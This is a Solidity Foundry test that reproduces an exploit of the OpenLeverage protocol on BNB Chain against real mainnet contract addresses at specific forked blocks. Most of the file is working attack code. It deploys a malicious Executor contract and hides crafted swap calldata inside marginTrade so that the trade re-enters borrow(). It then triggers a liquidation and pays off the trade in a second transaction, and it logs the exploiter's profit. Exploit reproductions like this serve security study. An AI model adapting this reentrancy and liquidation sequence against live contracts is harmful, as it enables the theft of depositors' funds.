// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IWBNB.sol";
import "@interface/IERC20.sol";
import "@interface/IPancakeV2.sol";

import "./Ix0LE.sol";
import "./ITradeController.sol";
import "./ILToken.sol";
import "./IOPBorrowingDelegator.sol";

// 0xf78a85eb32a193e3ed2e708803b57ea8ea22a7f25792851e3de2d7945e6d02d5 37470329
// 0x210071108f3e5cd24f49ef4b8bcdc11804984b0c0334e18a9a2cdb4cd5186067 37470332

IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IERC20 constant USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IxOLE constant xOLE = IxOLE(
    payable(0x71F1158D76aF5B6762D5EbCdEE19105eab2C77d2)
);
IERC20 constant OLE = IERC20(0xB7E2713CF55cf4b469B5a8421Ae6Fc0ED18F1467);

IPancakeRouterV2 constant PancakeV2Router = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);
IPancakePairV2 constant USDC_OLE = IPancakePairV2(
    0x44f508dcDa27E8AFa647cD978510EAC5e63E16a4
);

ITradeController constant TradeController = ITradeController(
    0x6A75aC4b8d8E76d15502E69Be4cb6325422833B4
);

ILToken constant LToken = ILToken(
    payable(0x7c5e04894410e98b1788fbdB181FfACbf8e60617)
);

IOPBorrowingDelegator constant OPBorrowingDelegator = IOPBorrowingDelegator(
    0xF436F8FE7B26D87eb74e5446aCEc2e8aD4075E47
);

contract Executor {
    address owner;

    // address private constant AggregationRouterAddr = 0x1111111254EEB25477B68fb85Ed929f73A960582;
    constructor() {
        owner = msg.sender;
    }

    function execute(address /* _sender */) external {
        WBNB.approve(address(PancakeV2Router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        PancakeV2Router.swapExactTokensForTokens(
            WBNB.balanceOf(address(this)),
            1,
            path,
            msg.sender,
            block.timestamp
        );
        (bool success, ) = owner.call(abi.encodeWithSignature("borrow()"));
        require(success, "Call to borrow not successful");
    }
}

contract OpenLeverageTest is Test {
    struct SwapDescription {
        address srcToken;
        address dstToken;
        address srcReceiver;
        address dstReceiver;
        uint256 amount;
        uint256 minReturnAmount;
        uint256 flags;
    }
    uint16 marketId = 24;

    function setUp() public {
        vm.createSelectFork("bsc", 37470329 - 1);

        deal(address(this), 5 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        USDC.approve(address(PancakeV2Router), type(uint256).max);
        USDT.approve(address(PancakeV2Router), type(uint256).max);

        // 1 BNB -> 100 USDC -> 100 OLE
        BnbForOle();

        // Add liquidity to pair
        OLE.transfer(address(USDC_OLE), OLE.balanceOf(address(this)));
        USDC.transfer(address(USDC_OLE), USDC.balanceOf(address(this)));
        USDC_OLE.mint(address(this));
        // print("USDC_OLE balance", USDC_OLE.balanceOf(address(this)), 18);
        // USDC_OLE balance: 0.000000000000000028

        USDC_OLE.approve(address(xOLE), USDC_OLE.balanceOf(address(this)));

        // 3 weeks
        xOLE.create_lock(1, 3 * 7 * 86400 + block.timestamp);

        (, , , , uint16 marginLimit, , , , , ) = TradeController.markets(
            marketId
        );

        uint256 underlyingWBNBBal = LToken.getCash();
        if (underlyingWBNBBal > 1e14) {
            (bool success, ) = address(LToken).call(
                abi.encodeWithSignature("accrueInterest()")
            );
            require(success, "Call to accrueInterest() not successful");
            // LToken.availableForBorrow();
            address[] memory path = new address[](3);
            path[0] = address(WBNB);
            path[1] = address(USDT);
            path[2] = address(WBNB);
            uint256[] memory amountsOut = PancakeV2Router.getAmountsOut(
                address(this).balance,
                path
            );
            uint256 amountToBorrow = (amountsOut[2] * 3000) / marginLimit;
            uint256[] memory amounts = BnbForUsdt();
            USDT.approve(address(TradeController), amounts[1]);

            Executor executor = new Executor();
            SwapDescription memory desc = SwapDescription({
                srcToken: address(WBNB),
                dstToken: address(USDT),
                srcReceiver: address(executor),
                dstReceiver: address(TradeController),
                amount: amountToBorrow,
                minReturnAmount: 1,
                flags: 4
            });
            bytes memory permit = "";
            bytes memory data = abi.encode(
                address(this),
                address(WBNB),
                address(USDT),
                65_560,
                address(OPBorrowingDelegator)
            );
            bytes memory swapData = abi.encodeWithSelector(
                bytes4(0x12aa3caf),
                address(executor),
                desc,
                permit,
                data
            );
            // First byte = Dex ID
            bytes memory dexData = abi.encodePacked(
                bytes5(hex"1500000002"),
                swapData
            );
            TradeController.marginTrade(
                marketId,
                true,
                true,
                amountsOut[1],
                amountToBorrow,
                0,
                dexData
            );
            OPBorrowingDelegator.liquidate(marketId, true, address(this));
        }

        // Second TX
        vm.rollFork(37470332 - 1);

        TradeController.markets(marketId);
        TradeController.payoffTrade(marketId, true);
        WBNB.withdraw(WBNB.balanceOf(address(this)));
        USDTForBNB();

        print("Exploiter BNB balance after attack", address(this).balance, 18);
    }

    function borrow() external {
        USDT.approve(address(OPBorrowingDelegator), type(uint256).max);
        TradeController.markets(marketId);
        OPBorrowingDelegator.borrow(marketId, true, 1_000_000, 0);
    }

    function BnbForUsdt() internal returns (uint256[] memory amounts) {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDT);

        amounts = PancakeV2Router.swapExactETHForTokens{
            value: address(this).balance
        }(0, path, address(this), block.timestamp);
    }

    function USDTForBNB() private {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(WBNB);

        PancakeV2Router.swapExactTokensForETH(
            USDT.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function BnbForOle() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDC);
        PancakeV2Router.swapETHForExactTokens{value: 2}(
            100, // amountOut
            path,
            address(this),
            block.timestamp
        );

        // print("USDT", USDC.balanceOf(address(this)), 18);
        // print("BNB", address(this).balance, 18);

        // 9 USDC -> 100 OLE
        path[0] = address(USDC);
        path[1] = address(OLE);
        PancakeV2Router.swapTokensForExactTokens(
            100, // amountOut
            100, // amountInMax
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}
